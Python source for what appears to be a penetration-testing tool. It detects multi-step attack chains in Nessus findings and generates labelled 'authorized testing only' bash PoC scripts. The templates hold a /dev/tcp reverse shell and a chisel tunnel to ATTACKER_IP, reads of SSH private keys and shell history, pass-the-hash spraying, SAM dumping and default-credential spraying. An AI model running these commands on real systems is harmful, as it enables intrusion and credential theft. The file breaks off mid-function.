"""
attack_chain_engine.py — AA-VAPT Attack Chain Detection Engine

Takes loaded Nessus findings and detects multi-step attack paths that
individual findings miss. Each chain:
  1. Rule-based detection  → which chain patterns match
  2. LLM narrative         → Ollama explains the path + business impact
  3. Risk upgrade          → combined risk > individual severities
  4. PoC script            → ready-to-run bash for the full chain

Usage:
    from backend.attack_chain_engine import run_chain_detection
    result = await run_chain_detection(findings)
"""

import re
import logging
import asyncio
from typing import Optional
from datetime import datetime

log = logging.getLogger("aavapt.chainengine")


# ══════════════════════════════════════════════════════════════════════════════
#  CHAIN RULE DEFINITIONS
#  Each rule = a named attack path with:
#    requires   : list of condition groups (ALL groups must match at least one finding)
#    any_of     : optional — at least one group must match (OR logic)
#    upgraded_risk : final chain severity (always >= individual finding severity)
#    mitre      : MITRE ATT&CK technique IDs
#    generates  : PoC script template key
# ══════════════════════════════════════════════════════════════════════════════

CHAIN_RULES = [
    {
        "id": "smb_relay_ntlm",
        "name": "LLMNR Poisoning → NTLMv1 Capture → SMB Relay → Admin Access",
        "description": (
            "LLMNR/NBT-NS is enabled, allowing an attacker to poison name resolution "
            "and capture NTLMv1 hashes. SMB signing is disabled, so captured hashes "
            "can be relayed directly to other hosts without cracking — giving the "
            "attacker admin access on any machine that accepts the relayed credential."
        ),
        "requires": [
            {"label": "LLMNR/NBT-NS enabled", "keywords": ["llmnr", "nbt-ns", "nbt ns", "netbios name"], "plugin_ids": ["35371", "57608"]},
            {"label": "NTLMv1 / LM allowed", "keywords": ["ntlmv1", "lm authentication", "lanman", "ntlm v1", "lm hash"], "plugin_ids": ["26920", "73182"]},
            {"label": "SMB signing disabled", "keywords": ["smb signing", "message signing", "smb message signing not required", "signing disabled"], "plugin_ids": ["57608", "96982"]},
        ],
        "upgraded_risk": "CRITICAL",
        "steps": [
            "Attacker runs Responder on the network segment",
            "LLMNR/NBT-NS broadcast poisons name resolution for target host",
            "Victim machine sends NTLMv1 challenge/response to attacker",
            "ntlmrelayx.py relays hash to SMB on another host (signing disabled)",
            "Admin shell obtained on target without ever cracking the password",
        ],
        "mitre": ["T1557.001", "T1550.002"],
        "generates": "smb_relay",
        "references": ["https://www.bettercap.org", "https://github.com/fortra/impacket"],
    },
    {
        "id": "kerberoasting_path",
        "name": "Weak Kerberos Policy → SPN Enumeration → Offline Hash Cracking",
        "description": (
            "Weak Kerberos ticket encryption (RC4/DES) combined with service accounts "
            "having weak or default passwords allows any domain user to request service "
            "tickets and crack them offline — potentially compromising privileged service accounts."
        ),
        "requires": [
            {"label": "Weak Kerberos encryption", "keywords": ["kerberos", "rc4", "des encryption", "weak kerberos", "kerberos des", "arcfour"], "plugin_ids": ["57608", "70658"]},
            {"label": "Service accounts / SPNs", "keywords": ["service principal", "spn", "service account", "kerberoast", "setspn"], "plugin_ids": []},
        ],
        "any_of": [
            {"label": "Weak AD password policy", "keywords": ["password policy", "weak password", "password complexity", "minimum password"], "plugin_ids": ["10900", "35371"]},
            {"label": "Default credentials found", "keywords": ["default password", "default credential", "default account"], "plugin_ids": []},
        ],
        "upgraded_risk": "HIGH",
        "steps": [
            "Any low-privileged domain user runs: GetUserSPNs.py domain/user:pass -request",
            "Service ticket (TGS) retrieved for every SPN in Active Directory",
            "Tickets exported and cracked offline with hashcat (-m 13100)",
            "Cracked password reused to authenticate as the service account",
            "Service account may have local admin / delegation rights on multiple hosts",
        ],
        "mitre": ["T1558.003"],
        "generates": "kerberoast",
        "references": ["https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py"],
    },
    {
        "id": "pth_lateral_movement",
        "name": "Credential Exposure → Pass-the-Hash → Lateral Movement",
        "description": (
            "Cleartext or NTLM credentials found in scan (weak auth, default creds, "
            "or plugin output) combined with SMB access allows Pass-the-Hash lateral "
            "movement across the network without needing the plaintext password."
        ),
        "requires": [
            {"label": "Credentials / hashes exposed", "keywords": ["cleartext", "plain text credential", "password in", "default password", "hash", "credential"], "plugin_ids": ["26920", "10900"]},
            {"label": "SMB / WMI accessible", "keywords": ["smb", "windows management", "wmi", "cifs", "admin share", "ipc$"], "plugin_ids": []},
        ],
        "upgraded_risk": "CRITICAL",
        "steps": [
            "Harvest NTLM hash or cleartext credential from finding/plugin output",
            "Use crackmapexec or impacket to spray hash across entire subnet",
            "Identify hosts where hash is valid (local admin reuse is common)",
            "psexec.py / wmiexec.py to get shell using hash directly",
            "Repeat on each compromised host to reach Domain Controller",
        ],
        "mitre": ["T1550.002", "T1021.002"],
        "generates": "pass_the_hash",
        "references": ["https://github.com/byt3bl33d3r/CrackMapExec"],
    },
    {
        "id": "ssl_downgrade_mitm",
        "name": "Weak TLS + No HSTS → SSL Stripping → Credential Interception",
        "description": (
            "Weak TLS protocols (SSLv3/TLS1.0) combined with missing HSTS header "
            "allows an on-path attacker to strip HTTPS and intercept credentials "
            "transmitted in cleartext."
        ),
        "requires": [
            {"label": "Weak TLS protocol", "keywords": ["sslv3", "ssl 3.0", "tls 1.0", "tls1.0", "poodle", "weak cipher", "rc4"], "plugin_ids": ["20007", "78479", "84821"]},
            {"label": "Missing HSTS / insecure HTTP", "keywords": ["hsts", "strict-transport", "http cleartext", "unencrypted", "mixed content"], "plugin_ids": ["84502", "60085"]},
        ],
        "upgraded_risk": "HIGH",
        "steps": [
            "Attacker performs ARP poisoning to become on-path (bettercap/arpspoof)",
            "SSLstrip downgrades HTTPS to HTTP by intercepting redirect",
            "HSTS not enforced → browser accepts HTTP connection",
            "Credentials transmitted in cleartext, captured by attacker",
            "Session cookies stolen → account takeover without knowing password",
        ],
        "mitre": ["T1557.002", "T1040"],
        "generates": "ssl_strip",
        "references": ["https://github.com/byt3bl33d3r/MITMf"],
    },
    {
        "id": "default_creds_rce",
        "name": "Default Credentials → Authenticated Access → Remote Code Execution",
        "description": (
            "Default or weak credentials on a management interface (web panel, SSH, "
            "database, network device) allow an attacker to authenticate and escalate "
            "to remote code execution on the host."
        ),
        "requires": [
            {"label": "Default credentials", "keywords": ["default password", "default credential", "default account", "factory default", "anonymous login", "blank password"], "plugin_ids": ["10900", "26920", "70658"]},
            {"label": "Management / admin interface", "keywords": ["admin", "management", "console", "panel", "interface", "login", "authentication"], "plugin_ids": []},
        ],
        "upgraded_risk": "CRITICAL",
        "steps": [
            "Identify management interface from Nessus finding (host:port)",
            "Login with default credentials (admin/admin, admin/password, etc.)",
            "Explore admin functions — look for: file upload, command exec, script runner",
            "Upload webshell or execute OS command through admin functionality",
            "Establish reverse shell for persistent access",
        ],
        "mitre": ["T1078.001", "T1059"],
        "generates": "default_creds",
        "references": [],
    },
    {
        "id": "openssh_cve_pivot",
        "name": "OpenSSH Vulnerability → Initial Access → Lateral Movement",
        "description": (
            "An exploitable OpenSSH CVE (regreSSHion/other RCE) on an internet-facing "
            "or internal host provides initial foothold. From there, SSH key reuse or "
            "weak credentials allow lateral movement to connected hosts."
        ),
        "requires": [
            {"label": "OpenSSH CVE", "keywords": ["openssh", "ssh cve", "regresshion", "cve-2024-6387", "cve-2023", "ssh rce", "ssh vulnerability"], "plugin_ids": ["10881", "153953"]},
            {"label": "SSH accessible on multiple hosts", "keywords": ["ssh", "port 22", "openssh"], "plugin_ids": ["10881"]},
        ],
        "upgraded_risk": "CRITICAL",
        "steps": [
            "Identify OpenSSH version from Nessus plugin output",
            "Check CVE applicability — verify version range matches",
            "Exploit using public PoC (e.g. regreSSHion PoC for CVE-2024-6387)",
            "Extract SSH keys, known_hosts, bash_history from compromised host",
            "Use found keys to SSH laterally to all referenced hosts in known_hosts",
        ],
        "mitre": ["T1190", "T1021.004"],
        "generates": "openssh_pivot",
        "references": ["https://github.com/zgzhang/cve-2024-6387-poc"],
    },
    {
        "id": "web_to_internal_pivot",
        "name": "Web App Vulnerability → Server Compromise → Internal Network Pivot",
        "description": (
            "A web application vulnerability (RCE, SQLi with file write, SSRF) on an "
            "internet-facing server allows an attacker to compromise the web server and "
            "use it as a pivot point into the internal network."
        ),
        "requires": [
            {"label": "Web app vulnerability (RCE/SQLi/SSRF)", "keywords": ["sql injection", "remote code execution", "rce", "ssrf", "command injection", "file inclusion", "lfi", "rfi", "log4j", "log4shell"], "plugin_ids": []},
            {"label": "Internal network reachable from server", "keywords": ["internal", "intranet", "private ip", "10.0.", "192.168.", "172.16.", "network access"], "plugin_ids": []},
        ],
        "upgraded_risk": "CRITICAL",
        "steps": [
            "Exploit web vulnerability to gain shell on web server",
            "Enumerate network interfaces: ip a / ifconfig",
            "Identify internal network ranges from routing table",
            "Set up SOCKS proxy via chisel/ligolo-ng for tunneling",
            "Scan internal network through proxy — run nmap via proxychains",
            "Attack internal systems that have no internet-facing exposure",
        ],
        "mitre": ["T1190", "T1572", "T1021"],
        "generates": "web_pivot",
        "references": ["https://github.com/jpillora/chisel", "https://github.com/nicocha30/ligolo-ng"],
    },
    {
        "id": "snmp_recon_to_compromise",
        "name": "SNMP Default Community → Network Recon → Config Extraction",
        "description": (
            "SNMP with default community string 'public' or 'private' allows an "
            "attacker to enumerate network topology, extract device configurations, "
            "and potentially write configs (SNMP v1/v2c write access)."
        ),
        "requires": [
            {"label": "SNMP default community", "keywords": ["snmp", "community string", "public community", "snmp v1", "snmp v2"], "plugin_ids": ["10264", "41028"]},
            {"label": "Network devices / routers", "keywords": ["network device", "router", "switch", "cisco", "hp", "juniper", "firewall", "snmp walk"], "plugin_ids": []},
        ],
        "upgraded_risk": "HIGH",
        "steps": [
            "snmpwalk -v2c -c public <host> — full MIB walk",
            "Extract interface list, ARP table, routing table",
            "Identify all internally reachable hosts from routing table",
            "Check for SNMP write access: snmpset test",
            "If write enabled: modify interface config or default route",
        ],
        "mitre": ["T1046", "T1602.002"],
        "generates": "snmp_recon",
        "references": [],
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  PoC SCRIPT TEMPLATES
# ══════════════════════════════════════════════════════════════════════════════

POC_TEMPLATES = {
    "smb_relay": '''#!/usr/bin/env bash
# AA-VAPT PoC — SMB Relay Chain
# Chain : LLMNR → NTLMv1 → SMB Relay → Admin Access
# MITRE : T1557.001, T1550.002
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"
INTERFACE="${1:-eth0}"
LHOST="${2:-$(ip -4 addr show $INTERFACE 2>/dev/null | grep -oP \'(?<=inet )\\S+\' | cut -d/ -f1)}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — SMB Relay PoC               |"
echo "  |  LLMNR Poison → NTLMv1 → Relay         |"
echo "  +=========================================+"
echo -e "${NC}"
echo -e "  Interface : ${BOLD}${INTERFACE}${NC}"
echo -e "  Targets   : ${BOLD}${TARGETS}${NC}"
echo ""

# Step 1: Build target list for ntlmrelayx
echo -e "${YELLOW}[1/3]${NC} Building relay target list..."
RELAY_TARGETS=""
for T in $TARGETS; do
  RELAY_TARGETS="${RELAY_TARGETS}smb://${T} "
done
echo "  Relay targets: $RELAY_TARGETS"
echo ""

# Step 2: Check tools
echo -e "${YELLOW}[2/3]${NC} Checking required tools..."
for tool in responder ntlmrelayx.py impacket-ntlmrelayx; do
  command -v $tool &>/dev/null && echo -e "  ${GREEN}+${NC} $tool found" || echo -e "  ${RED}x${NC} $tool missing — install: pip3 install impacket"
done
echo ""

# Step 3: Print attack commands
echo -e "${YELLOW}[3/3]${NC} Attack commands (run in separate terminals):"
echo ""
echo -e "${BOLD}Terminal 1 — Responder (poisoner):${NC}"
echo -e "  ${CYAN}sudo responder -I ${INTERFACE} -rdwv${NC}"
echo ""
echo -e "${BOLD}Terminal 2 — ntlmrelayx (relay):${NC}"
for T in $TARGETS; do
  echo -e "  ${CYAN}sudo impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -i${NC}"
done
echo ""
echo -e "${BOLD}Relay target file:${NC}"
echo -e "  ${CYAN}echo '${RELAY_TARGETS// /\\n}' > /tmp/relay_targets.txt${NC}"
echo ""
echo -e "${GREEN}[+]${NC} If relay succeeds — interactive SMB shell:"
echo -e "  ${CYAN}nc 127.0.0.1 11000${NC}"
echo ""
echo -e "${RED}[!]${NC} Disable LLMNR remediation: Group Policy → Network → DNS Client → Turn off multicast name resolution = Enabled"
''',

    "kerberoast": '''#!/usr/bin/env bash
# AA-VAPT PoC — Kerberoasting Path
# Chain : Weak Kerberos → SPN Enum → Offline Crack
# MITRE : T1558.003
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

DC_IP="${1:-__DC_IP__}"
DOMAIN="${2:-DOMAIN.LOCAL}"
USER="${3:-lowpriv_user}"
PASS="${4:-password123}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — Kerberoasting PoC           |"
echo "  |  SPN Enum → TGS Request → Crack        |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/4]${NC} Enumerating SPNs..."
echo -e "  ${CYAN}impacket-GetUserSPNs ${DOMAIN}/${USER}:${PASS} -dc-ip ${DC_IP} -request${NC}"
echo ""

echo -e "${YELLOW}[2/4]${NC} Save hashes to file..."
echo -e "  ${CYAN}impacket-GetUserSPNs ${DOMAIN}/${USER}:${PASS} -dc-ip ${DC_IP} -request -outputfile /tmp/kerberoast_hashes.txt${NC}"
echo ""

echo -e "${YELLOW}[3/4]${NC} Crack offline with hashcat..."
echo -e "  ${CYAN}hashcat -m 13100 /tmp/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force${NC}"
echo ""

echo -e "${YELLOW}[4/4]${NC} Authenticate with cracked password..."
echo -e "  ${CYAN}impacket-psexec ${DOMAIN}/svc_account:cracked_pass@${DC_IP}${NC}"
echo ""

echo -e "${GREEN}[+]${NC} Remediation: Use gMSA accounts, enforce AES-only Kerberos, strong passwords on service accounts"
''',

    "pass_the_hash": '''#!/usr/bin/env bash
# AA-VAPT PoC — Pass-the-Hash Lateral Movement
# Chain : Credential Exposure → PtH → Lateral Movement
# MITRE : T1550.002, T1021.002
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"
HASH="${1:-aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE}"
DOMAIN="${2:-.}"
USER="${3:-Administrator}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — Pass-the-Hash PoC           |"
echo "  |  Hash Spray → Shell                    |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/3]${NC} Spray hash across targets with CrackMapExec..."
for T in $TARGETS; do
  echo -e "  ${CYAN}crackmapexec smb ${T} -u '${USER}' -H '${HASH}' -d '${DOMAIN}'${NC}"
done
echo ""

echo -e "${YELLOW}[2/3]${NC} Get shell on successful targets..."
for T in $TARGETS; do
  echo -e "  ${CYAN}impacket-psexec ${DOMAIN}/${USER}@${T} -hashes '${HASH}'${NC}"
done
echo ""

echo -e "${YELLOW}[3/3]${NC} Dump SAM/NTDS on compromised host..."
for T in $TARGETS; do
  echo -e "  ${CYAN}crackmapexec smb ${T} -u '${USER}' -H '${HASH}' --sam${NC}"
done
echo ""
echo -e "${GREEN}[+]${NC} Remediation: Enforce Credential Guard, disable LM hash storage, enable LAPS"
''',

    "ssl_strip": '''#!/usr/bin/env bash
# AA-VAPT PoC — SSL Strip / MITM Chain
# Chain : Weak TLS + No HSTS → SSL Strip → Credential Capture
# MITRE : T1557.002, T1040
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"
INTERFACE="${1:-eth0}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — SSL Strip PoC               |"
echo "  |  ARP Poison → Strip → Capture          |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/3]${NC} Verify weak TLS on targets..."
for T in $TARGETS; do
  echo -e "  ${CYAN}testssl --color 0 --warnings off ${T}:443 | grep -iE 'SSLv3|TLS 1.0|RC4|POODLE'${NC}"
done
echo ""

echo -e "${YELLOW}[2/3]${NC} Verify HSTS missing..."
for T in $TARGETS; do
  echo -e "  ${CYAN}curl -sI https://${T}/ | grep -i strict-transport${NC}"
done
echo ""

echo -e "${YELLOW}[3/3]${NC} Execute MITM (bettercap)..."
echo -e "  ${CYAN}sudo bettercap -iface ${INTERFACE} -eval 'net.probe on; arp.spoof on; http.proxy on; set http.proxy.sslstrip true; net.sniff on'${NC}"
echo ""
echo -e "${GREEN}[+]${NC} Remediation: Enforce TLS 1.2+, add HSTS header (max-age=31536000; includeSubDomains)"
''',

    "default_creds": '''#!/usr/bin/env bash
# AA-VAPT PoC — Default Credentials → RCE Chain
# Chain : Default Creds → Auth → RCE
# MITRE : T1078.001, T1059
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — Default Credentials PoC     |"
echo "  |  Auth → Admin Panel → RCE              |"
echo "  +=========================================+"
echo -e "${NC}"

DEFAULT_CREDS=("admin:admin" "admin:password" "admin:12345" "root:root" "admin:" "admin:admin123")

echo -e "${YELLOW}[1/3]${NC} Testing default credentials on targets..."
for T in $TARGETS; do
  echo -e "  Target: ${BOLD}${T}${NC}"
  for CRED in "${DEFAULT_CREDS[@]}"; do
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    echo -e "    ${CYAN}curl -sk -u '${CRED}' http://${T}/ -o /dev/null -w '%{http_code}' | grep -v 401${NC}"
  done
  echo ""
done

echo -e "${YELLOW}[2/3]${NC} Broader spray with hydra..."
for T in $TARGETS; do
  echo -e "  ${CYAN}hydra -L /usr/share/wordlists/metasploit/default_users_for_services.txt \\
    -P /usr/share/wordlists/metasploit/default_pass_for_services.txt \\
    -s 80 http-get ${T}${NC}"
done
echo ""

echo -e "${YELLOW}[3/3]${NC} After auth — look for RCE vectors..."
echo "  - File upload → upload webshell"
echo "  - Command exec / ping test fields"
echo "  - Script runner / task scheduler"
echo "  - Config backup/restore (often allows file write)"
echo ""
echo -e "${GREEN}[+]${NC} Remediation: Change all default passwords, disable unused admin interfaces, enforce MFA"
''',

    "openssh_pivot": '''#!/usr/bin/env bash
# AA-VAPT PoC — OpenSSH CVE → Pivot Chain
# Chain : OpenSSH CVE → Foothold → Lateral Movement
# MITRE : T1190, T1021.004
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — OpenSSH CVE Pivot PoC       |"
echo "  |  CVE Exploit → Keys → Lateral Move     |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/4]${NC} Verify OpenSSH version on targets..."
for T in $TARGETS; do
  echo -e "  ${CYAN}ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@${T} -v 2>&1 | grep 'remote software version'${NC}"
  echo -e "  ${CYAN}nmap -Pn -p 22 --script ssh-hostkey,banner ${T}${NC}"
done
echo ""

echo -e "${YELLOW}[2/4]${NC} Check CVE-2024-6387 (regreSSHion) applicability..."
echo -e "  Affected: OpenSSH < 4.4p1 (if not patched for CVE-2006-5051)"
echo -e "  Affected: OpenSSH 8.5p1 – 9.7p1"
echo -e "  ${CYAN}# Download PoC: https://github.com/zgzhang/cve-2024-6387-poc${NC}"
echo ""

echo -e "${YELLOW}[3/4]${NC} Post-exploitation — extract pivot data..."
echo -e "  ${CYAN}cat ~/.ssh/known_hosts${NC}      # other reachable hosts"
echo -e "  ${CYAN}cat ~/.ssh/id_rsa${NC}            # private keys"
echo -e "  ${CYAN}cat ~/.bash_history${NC}          # commands with IPs/creds"
echo -e "  ${CYAN}cat /etc/hosts${NC}               # internal hostnames"
echo ""

echo -e "${YELLOW}[4/4]${NC} Lateral movement with found keys..."
echo -e "  ${CYAN}for host in $(cat known_hosts | cut -d' ' -f1); do ssh -i id_rsa user@$host id 2>/dev/null; done${NC}"
echo ""
echo -e "${GREEN}[+]${NC} Remediation: Patch OpenSSH, disable PasswordAuthentication, enforce key-based auth only"
''',

    "web_pivot": '''#!/usr/bin/env bash
# AA-VAPT PoC — Web App → Internal Pivot Chain
# Chain : Web RCE/SQLi → Shell → Internal Pivot
# MITRE : T1190, T1572, T1021
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"
LHOST="${1:-ATTACKER_IP}"
LPORT="${2:-4444}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — Web to Internal Pivot PoC   |"
echo "  |  Web Shell → Chisel → Internal Scan    |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/4]${NC} Confirm web vulnerability..."
for T in $TARGETS; do
  echo -e "  ${CYAN}curl -sk http://${T}/?id=1' -- -${NC}    # SQLi test"
  echo -e "  ${CYAN}curl -sk 'http://${T}/$(id)'${NC}         # Command injection test"
done
echo ""

echo -e "${YELLOW}[2/4]${NC} Get reverse shell..."
echo -e "  ${BOLD}Listener:${NC}"
echo -e "  ${CYAN}nc -lvnp ${LPORT}${NC}"
echo -e "  ${BOLD}Payload:${NC}"
echo -e "  ${CYAN}bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1${NC}"
echo ""

echo -e "${YELLOW}[3/4]${NC} Set up SOCKS tunnel with chisel..."
echo -e "  ${BOLD}Attacker:${NC}"
echo -e "  ${CYAN}chisel server -p 8080 --reverse${NC}"
echo -e "  ${BOLD}Victim (on shell):${NC}"
echo -e "  ${CYAN}./chisel client ${LHOST}:8080 R:socks${NC}"
echo ""

echo -e "${YELLOW}[4/4]${NC} Scan internal network via proxy..."
echo -e "  ${CYAN}proxychains nmap -Pn -sT -p 22,80,443,445,3389 192.168.0.0/24${NC}"
echo ""
echo -e "${GREEN}[+]${NC} Remediation: WAF, input validation, network segmentation, egress filtering"
''',

    "snmp_recon": '''#!/usr/bin/env bash
# AA-VAPT PoC — SNMP Default Community → Recon Chain
# Chain : SNMP Default Community → MIB Walk → Topology Map
# MITRE : T1046, T1602.002
# !! For authorized penetration testing only !!
# Generated: __TS__

RED=\'\\033[0;31m\'; GREEN=\'\\033[0;32m\'; YELLOW=\'\\033[1;33m\'
CYAN=\'\\033[0;36m\'; BOLD=\'\\033[1m\'; NC=\'\\033[0m\'

TARGETS="__HOSTS__"
COMMUNITY="${1:-public}"

echo -e "${CYAN}${BOLD}"
echo "  +=========================================+"
echo "  |  AA-VAPT — SNMP Recon Chain PoC        |"
echo "  |  Default Community → Topology Leak     |"
echo "  +=========================================+"
echo -e "${NC}"

echo -e "${YELLOW}[1/3]${NC} Full MIB walk..."
for T in $TARGETS; do
  echo -e "  ${CYAN}snmpwalk -v2c -c ${COMMUNITY} ${T} 2>/dev/null | tee snmp_${T}.txt${NC}"
done
echo ""

echo -e "${YELLOW}[2/3]${NC} Extract network topology..."
for T in $TARGETS; do
  echo -e "  ${BOLD}ARP table:${NC}   ${CYAN}snmpwalk -v2c -c ${COMMUNITY} ${T} 1.3.6.1.2.1.4.22.1.2${NC}"
  echo -e "  ${BOLD}Routing:${NC}     ${CYAN}snmpwalk -v2c -c ${COMMUNITY} ${T} 1.3.6.1.2.1.4.21${NC}"
  echo -e "  ${BOLD}Interfaces:${NC}  ${CYAN}snmpwalk -v2c -c ${COMMUNITY} ${T} 1.3.6.1.2.1.2.2.1.10${NC}"
done
echo ""

echo -e "${YELLOW}[3/3]${NC} Check write access (SNMP v1/v2c write)..."
for T in $TARGETS; do
  echo -e "  ${CYAN}snmpset -v2c -c private ${T} 1.3.6.1.2.1.1.6.0 s 'AA-VAPT-TEST' 2>&1${NC}"
done
echo ""
echo -e "${GREEN}[+]${NC} Remediation: Use SNMPv3 with auth+priv, change community strings, firewall UDP/161"
''',
}


# ══════════════════════════════════════════════════════════════════════════════
#  CORE DETECTION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def _finding_text(f: dict) -> str:
    """Flatten a finding to searchable lowercase text."""
    return " ".join([
        f.get("name", ""),
        f.get("synopsis", ""),
        f.get("plugin_output", ""),
        f.get("plugin_id", ""),
        " ".join(f.get("cves", [])),
        f.get("service", ""),
        f.get("port", ""),
    ]).lower()


def _condition_matches(condition: dict, findings: list) -> list:
    """
    Return list of findings that satisfy a condition group.
    A finding matches if it contains any keyword OR matches any plugin_id.
    """
    keywords = [k.lower() for k in condition.get("keywords", [])]
    plugin_ids = set(condition.get("plugin_ids", []))
    matched = []
    for f in findings:
        text = _finding_text(f)
        pid = str(f.get("plugin_id", ""))
        if (any(kw in text for kw in keywords) or pid in plugin_ids):
            matched.append(f)
    return matched


def _collect_hosts(findings: list) -> list:
    """Get unique hosts from a list of findings."""
    hosts = set()
    for f in findings:
        hosts.update(f.get("hosts", []))
        h = f.get("host", f.get("ip", ""))
        if h:
            hosts.add(h)
    return sorted(hosts)


def detect_chains(findings: list) -> list:
    """
    Run all chain rules against loaded findings.
    Returns list of matched chains with evidence and affected hosts.
    """
    detected = []

    for rule in CHAIN_RULES:
        # Check all required condition groups
        evidence_map = {}
        all_required_met = True

        for condition in rule.get("requires", []):
            matched = _condition_matches(condition, findings)
            if not matched:
                all_required_met = False
                break
            evidence_map[condition["label"]] = matched

        if not all_required_met:
            continue

        # Check any_of conditions (at least one must match)
        any_of = rule.get("any_of", [])
        if any_of:
            any_met = False
            for condition in any_of:
                matched = _condition_matches(condition, findings)
                if matched:
                    evidence_map[condition["label"]] = matched
                    any_met = True
            if not any_met:
                continue

        # Collect all affected hosts across all evidence findings
        all_evidence_findings = []
        for flist in evidence_map.values():
            all_evidence_findings.extend(flist)
        affected_hosts = _collect_hosts(all_evidence_findings)

        # Build evidence summary
        evidence_summary = []
        for label, flist in evidence_map.items():
            evidence_summary.append({
                "condition": label,
                "matched_findings": [
                    {
                        "name": f.get("name", ""),
                        "plugin_id": f.get("plugin_id", ""),
                        "severity": f.get("severity", ""),
                        "hosts": f.get("hosts", []),
                        "port": f.get("port", ""),
                    }
                    for f in flist[:5]  # cap at 5 per condition
                ],
            })

        detected.append({
            "chain_id": rule["id"],
            "name": rule["name"],
            "description": rule["description"],
            "upgraded_risk": rule["upgraded_risk"],
            "steps": rule["steps"],
            "mitre": rule["mitre"],
            "generates": rule["generates"],
            "references": rule["references"],
            "affected_hosts": affected_hosts,
            "evidence": evidence_summary,
            "individual_severities": sorted(
                set(f.get("severity", "info") for f in all_evidence_findings),
                key=lambda s: {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}.get(s, 5)
            ),
        })

    # Sort by risk level
    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    detected.sort(key=lambda c: risk_order.get(c["upgraded_risk"], 4))

    return detected


# ══════════════════════════════════════════════════════════════════════════════
#  PoC SCRIPT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_poc_script(chain: dict) -> str:
    """Generate a ready-to-run PoC bash script for a detected chain."""
    template_key = chain.get("generates", "")
    template = POC_TEMPLATES.get(template_key)
    if not template:
        return f"#!/usr/bin/env bash\n# No PoC template available for chain: {chain['chain_id']}\n"

    hosts_str = " ".join(chain.get("affected_hosts", ["TARGET_IP"]))
    dc_ip = chain.get("affected_hosts", ["DC_IP"])[0] if chain.get("affected_hosts") else "DC_IP"
    ts = datetime.now().strftime("%Y-%m-%d %H:%M")

    script = (template
              .replace("__HOSTS__", hosts_str)
              .replace("__DC_IP__", dc_ip)
              .replace("__TS__", ts))
    return script


# ══════════════════════════════════════════════════════════════════════════════
#  LLM NARRATIVE (Ollama)
# ══════════════════════════════════════════════════════════════════════════════

async def _llm_narrate_chain(chain: dict) -> str:
    """
    Ask Ollama to write a concise attack narrative for this chain.
    Falls back gracefully if Ollama is offline.
    """
    try:
        from backend.ai.ollama_client import _chat_async, is_ollama_running
        if not is_ollama_running():
            return _offline_narrative(chain)

        evidence_text = "\n".join(
            f"  - {e['condition']}: "
            + ", ".join(f["name"] for f in e["matched_findings"][:3])
            for e in chain["evidence"]
        )
        hosts_text = ", ".join(chain["affected_hosts"][:10]) or "multiple hosts"

        prompt = (
            f"You are a senior penetration tester writing a finding for a client report.\n\n"
            f"Attack Chain Detected: {chain['name']}\n"
            f"Upgraded Risk: {chain['upgraded_risk']}\n"
            f"Affected Hosts: {hosts_text}\n"
            f"MITRE ATT&CK: {', '.join(chain['mitre'])}\n\n"
